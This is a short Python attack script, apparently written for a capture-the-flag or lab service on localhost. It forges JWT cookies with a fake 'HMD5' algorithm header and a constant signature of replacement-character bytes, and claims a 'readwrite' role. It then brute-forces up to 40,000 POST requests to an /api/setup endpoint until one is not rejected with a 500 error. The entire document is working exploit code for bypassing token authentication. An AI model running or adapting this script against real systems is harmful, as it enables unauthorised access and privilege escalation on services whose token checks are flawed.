import base64
import tqdm
import requests
import random

header = base64.urlsafe_b64encode(b'{"typ":"JWT","alg":"HMD5"}').decode().strip('=')

signature = base64.urlsafe_b64encode(b'\xef\xbf\xbd' * 11).decode().strip('=')


for i in tqdm.tqdm(range(40000)):
  k = random.randint(111111, 9999999)
  body = base64.urlsafe_b64encode(('{"login":"paraddise12345","role":"readwrite","lalala": %d}' % k).encode()).decode().strip('=')
  jwtCook = header + "." + body + "." + signature

  # print("Senging with cookie", jwtCook)
  resp = requests.post(
    'http://localhost:8081/api/setup',
    cookies={
      "jwt": jwtCook
    },
    json={"mode": "Firefighter"},
    headers={
      "Content-Type": "application/json"
    }
  )

  # print(resp.status_code, resp.content)
  if resp.status_code != 500:
    print("Found working jwt", jwtCook)
    print(resp.content)
    break

